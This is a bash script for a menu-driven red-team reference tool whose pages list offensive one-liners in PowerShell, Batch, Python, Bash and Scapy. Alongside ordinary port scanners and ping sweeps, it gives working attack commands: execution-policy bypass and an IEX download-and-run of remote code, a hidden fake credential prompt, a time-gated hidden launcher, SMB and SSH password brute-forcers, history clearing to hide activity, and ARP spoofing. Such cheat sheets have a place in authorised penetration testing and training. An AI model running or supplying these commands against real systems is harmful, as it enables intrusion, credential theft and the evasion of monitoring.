#!/usr/bin/env bash
# modules/red/scripting.sh

red_scripting() {
    while true; do
        local c
        c=$(dialog --backtitle "$(backtitle)" \
            --title "  📜 RED — Scripting  " \
            --menu "\n  Scripting Reference:\n" 18 65 5 \
            "1" "  📘  PowerShell — Basics & oneliners" \
            "2" "  💬  Windows Batch — Scripting" \
            "3" "  🐍  Python — Security one-liners" \
            "4" "  🔮  Bash — Security scripts" \
            "5" "  🦈  Scapy — Packet crafting" \
            3>&1 1>&2 2>&3) || return 0
        case "$c" in
            1) _red_powershell ;;
            2) _red_batch ;;
            3) _red_python ;;
            4) _red_bash_scripts ;;
            5) _red_scapy ;;
        esac
    done
}

_red_powershell() { show_page "PowerShell — Security Scripting" \
"═══════════════════════════════════════════════════════════════
  PowerShell — Security Scripting                      [RED]
═══════════════════════════════════════════════════════════════

  BASICS
    Stop-Transcript
    Get-Content <FILE>             cat
    Get-Help <CMD> -Examples
    Get-Command *<STRING>*
    Get-Service
    Get-WmiObject -Class win32_service
    \$psVersionTable

  EXECUTION BYPASS
    powershell -ep bypass -nop -File <FILE>
    Set-ExecutionPolicy Bypass -Scope Process -Force

  TCP PORT SCANNER
    \$ports=(80,443,22,21,8080,3389)
    \$ip=\"<TARGET>\"
    foreach(\$p in \$ports){
      try{\$s=New-Object Net.Sockets.TCPClient(\$ip,\$p)}
      catch{}
      if(\$s -ne \$NULL){
        echo \"\$ip:\$p - Open\"
        \$s.Close()
        \$s=\$NULL
      } else {echo \"\$ip:\$p - Closed\"}
    }

  PING WITH TIMEOUT (500ms)
    \$ping=New-Object Net.NetworkInformation.Ping
    \$ping.Send(\"<IP>\",500)

  DOWNLOAD FILE
    Invoke-WebRequest -Uri \"<URL>\" -OutFile <FILE>
    (New-Object Net.WebClient).DownloadFile(\"<URL>\",\"<FILE>\")
    IEX (New-Object Net.WebClient).DownloadString(\"<URL>\")

  UPLOAD FILE VIA HTTP POST
    \$http=New-Object Net.WebClient
    \$http.UploadFile(\"http://<URL>\",\"<FILE>\")

  EXPORT WMI TO CSV
    Get-WmiObject -class win32_operatingsystem | \\
      select -property * | export-csv <FILE>

  SEND EMAIL
    Send-MailMessage -to \"<TO>\" -from \"<FROM>\" \\
      -subject \"<SUBJ>\" -a \"<ATTACH>\" \\
      -body \"<BODY>\" -SmtpServer \"<IP>\" \\
      -Port \"<PORT>\" -Credential \"<CRED>\" -UseSsl

  SCHEDULED EXECUTION WINDOW
    \$d=(Get-Date -format YYYYMMDD-HHMM)
    if(\$d -match '202408(0[8-9]|1[0-1])-(0[8-9]|1[0-7])[0-5][0-9]'){
      Start-Process -WindowStyle Hidden \"<FILE>\"
    }

  FAKE CREDENTIAL PROMPT
    powershell -WindowStyle Hidden -ExecutionPolicy Bypass \\
    \$Host.UI.PromptForCredential(\"<TITLE>\",\"<MSG>\",\"<USER>\",\"<DOMAIN>\")"; }

_red_batch() { show_page "Windows Batch Scripting" \
"═══════════════════════════════════════════════════════════════
  Windows Batch Scripting                              [RED]
═══════════════════════════════════════════════════════════════

  NOTE: In batch files, use %% instead of % for variables.

  NESTED PING SWEEP
    for /L %i in (10,1,254) do @(
      for /L %x in (10,1,254) do @
        ping -n 1 -w 100 10.10.%i.%x 2>nul |
        find \"Reply\" && echo 10.10.%i.%x >> live.txt
    )

  LOOP THROUGH FILE LINES
    for /F \"tokens=*\" %%A in (<FILE>) do echo %%A

  DOMAIN BRUTE FORCER
    for /F %%N in (users.txt) do
      for /F %%P in (passwords.txt) do
        net use \\\\<IP>\\IPC\$ /user:<DOMAIN>\\%%N %%P
        1>NUL 2>&1 && echo %%N:%%P >> success.txt

  SEARCH FILES BEGINNING WITH 'pass'
    forfiles /P <PATH> /s /m pass* -c
      \"cmd /c echo @isdir @fdate @ftime @relpath @path @fsize\"

  SIMULATE DNS LOOKUPS
    for /F \"tokens=*\" %%A in (domains.txt) do
      nslookup %%A <DNS_SERVER_IP>

  BATCH FILE TEMPLATE
    @echo off
    setlocal EnableDelayedExpansion
    set TARGET=192.168.1.0
    echo Starting scan of %TARGET%...
    for /L %%i in (1,1,254) do (
      ping -n 1 -w 100 192.168.1.%%i >nul 2>&1
      if !ERRORLEVEL! EQU 0 echo 192.168.1.%%i is UP
    )
    echo Done.
    endlocal"; }

_red_python() { show_page "Python — Security One-Liners" \
"═══════════════════════════════════════════════════════════════
  Python — Security One-Liners                         [RED]
═══════════════════════════════════════════════════════════════

  HTTP SERVER
    python3 -m http.server 8080
    python3 -m http.server 8080 --bind 0.0.0.0

  HTTPS SERVER (self-signed)
    python3 -c \"
    import http.server, ssl
    httpd = http.server.HTTPServer(('0.0.0.0',4443), \\
      http.server.SimpleHTTPRequestHandler)
    httpd.socket = ssl.wrap_socket(httpd.socket, \\
      keyfile='key.pem', certfile='cert.pem', server_side=True)
    httpd.serve_forever()\"

  PORT SCANNER
    python3 -c \"
    import socket
    for p in range(1,1025):
      s=socket.socket()
      s.settimeout(0.1)
      if s.connect_ex(('<TARGET>',p))==0: print(f'OPEN: {p}')
      s.close()\"

  BASE64 WORDLIST
    python3 -c \"
    import base64
    [print(base64.b64encode(l.strip().encode()).decode())
     for l in open('wordlist.txt')]\"

  WINDOWS REG HEX TO ASCII
    python3 -c \"
    import binascii
    print(binascii.unhexlify('<HEX>').decode('utf-16-le'))\"

  SEARCH FILES FOR REGEX
    python3 -c \"
    import re, os
    for root,dirs,files in os.walk('/path'):
      for f in files:
        fp=os.path.join(root,f)
        try:
          for l in open(fp):
            if re.search('<PATTERN>',l): print(f'{fp}: {l.strip()}')
        except: pass\"

  GENERATE RANDOM STRING
    python3 -c \"
    import random,string
    print(''.join(random.choices(string.ascii_letters,k=16)))\"

  EMAIL SENDER
    python3 -c \"
    import smtplib
    s=smtplib.SMTP('<SERVER>')
    s.sendmail('<FROM>','<TO>','Subject: <SUBJ>\\n<BODY>')
    s.quit()\"

  URL ENCODE/DECODE
    python3 -c \"import urllib.parse; print(urllib.parse.quote('<TEXT>'))\"
    python3 -c \"import urllib.parse; print(urllib.parse.unquote('<ENC>'))\""; }

_red_bash_scripts() { show_page "Bash — Security Scripts" \
"═══════════════════════════════════════════════════════════════
  Bash — Security Scripts                              [RED]
═══════════════════════════════════════════════════════════════

  PING SWEEP
    for x in {1..254..1}; do
      ping -c 1 1.1.1.\$x | grep \"64 b\" | \\
        cut -d\" \" -f4 >> ips.txt
    done

  REVERSE DNS LOOKUP SWEEP
    #!/bin/bash
    read -p \"Enter Class C (e.g. 192.168.1): \" range
    for ip in {1..254}; do
      host \$range.\$ip | grep \"name pointer\" | \\
        cut -d\" \" -f5
    done

  SUBNET BAN SCRIPT
    #!/bin/bash
    i=2
    while [[ \$i -le 253 ]]; do
      if [[ \$i -ne 20 && \$i -ne 21 && \$i -ne 22 ]]; then
        echo \"BANNING: 192.168.1.\$i\"
        arp -s 192.168.1.\$i 00:00:00:00:00:0a
      else
        echo \"SKIPPING: 192.168.1.\$i\"
      fi
      i=\$(expr \$i + 1)
    done

  PORT SCAN (bash)
    for port in {1..1000}; do
      (echo >/dev/tcp/<TARGET>/\$port) 2>/dev/null && \\
        echo \"OPEN: \$port\"
    done

  BRUTE FORCE SSH (bash loop)
    while IFS=: read user pass; do
      sshpass -p \"\$pass\" ssh -o StrictHostKeyChecking=no \\
        \$user@<TARGET> 'id' 2>/dev/null && \\
        echo \"SUCCESS: \$user:\$pass\"
    done < credentials.txt

  CLEAR BASH HISTORY
    export HISTFILE=/dev/null
    history -c
    unset HISTFILE"; }

_red_scapy() { show_page "Scapy — Packet Crafting" \
"═══════════════════════════════════════════════════════════════
  Scapy — Packet Crafting                              [RED]
═══════════════════════════════════════════════════════════════

  SETUP
    # pip install scapy
    # sudo scapy   (needs root for raw sockets)

  SEND IPv6 ICMP MESSAGE
    from scapy.all import *
    send(IPv6(dst=\"<TARGET>\")/ICMPv6EchoRequest())

  UDP PACKET WITH PAYLOAD
    from scapy.all import *
    send(IP(dst=\"<TARGET>\")/UDP(dport=<PORT>)/Raw(load=\"<PAYLOAD>\"))

  NTP FUZZER
    from scapy.all import *
    send(IP(dst=\"<TARGET>\")/UDP(sport=123,dport=123)/\\
      NTP(version=4,mode=3))

  SEND HTTP MESSAGE
    from scapy.all import *
    pkt=IP(dst=\"<TARGET>\")/TCP(dport=80,flags=\"S\")
    resp=sr1(pkt,timeout=1)
    send(IP(dst=\"<TARGET>\")/TCP(dport=80,\\
      sport=resp.dport,seq=1,ack=resp.seq+1,flags=\"A\"))

  SNIFF PACKETS
    from scapy.all import *
    sniff(iface=\"eth0\", count=10, prn=lambda x: x.summary())

  ARP SPOOF
    from scapy.all import *
    send(ARP(op=2, pdst=\"<VICTIM_IP>\", \\
      psrc=\"<GATEWAY_IP>\", hwdst=\"<VICTIM_MAC>\"), loop=1)

  CUSTOM TCP SYN SCAN
    from scapy.all import *
    for p in range(1,1025):
      r=sr1(IP(dst=\"<TARGET>\")/TCP(dport=p,flags=\"S\"),timeout=0.1,verbose=0)
      if r and r.haslayer(TCP) and r[TCP].flags==0x12:
        print(f\"OPEN: {p}\")"; }
